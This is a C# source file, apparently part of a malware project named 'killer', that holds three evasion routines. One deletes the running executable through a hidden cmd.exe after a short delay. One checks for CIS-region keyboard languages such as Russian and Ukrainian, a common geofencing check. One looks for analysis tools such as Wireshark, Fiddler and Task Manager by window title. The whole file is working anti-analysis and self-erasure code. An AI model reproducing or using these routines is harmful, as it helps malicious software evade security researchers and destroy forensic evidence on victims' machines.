using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Windows.Forms;

namespace killer
{
    class killerr
    {
        public static void SelfDel()
        {
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + 
(new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden, 
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
                return;
            }
            catch
            {
            }

        }
        public static bool CIS()
        {
            try
            {
                InputLanguageCollection lang = InputLanguage.InstalledInputLanguages; // Getting all laguages on PC
                string[] array = new string[] { "Kazakh", "Russian", "Belarusian", "Ukrainian", "Kyrgyz", "Uzbek", "Georgian", "Azerbaijani", "Tajik", "Armenian", "Turkmen" }; 
                foreach (object langs in lang)
                {
                    foreach (string value in array)
                    {
                        if (((InputLanguage)langs).Culture.EnglishName.Contains(value))
                        {
                            return true;
                        }
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }

        }
        public static bool antirevers3()
        {
            try
            {
                string[] analize = new string[] { "fiddler", "wpe pro", "wireshark", "http analyzer", "charles", "task manager", "process hacker" }; // new array with names of reverse programs, and other shit programs
                Process[] processes = Process.GetProcesses(); // Getting all processes
                foreach (Process process in processes)
                {
                    foreach (string s in analize)
                    {
                        if (process.MainWindowTitle.ToLower().Contains(s)) //if process = 1 of process from array, return true
                        {
                            return true;
                        }
                    }
                }
            }
            catch
            {
                return false;
            }

            return false; 
        }
    }
}
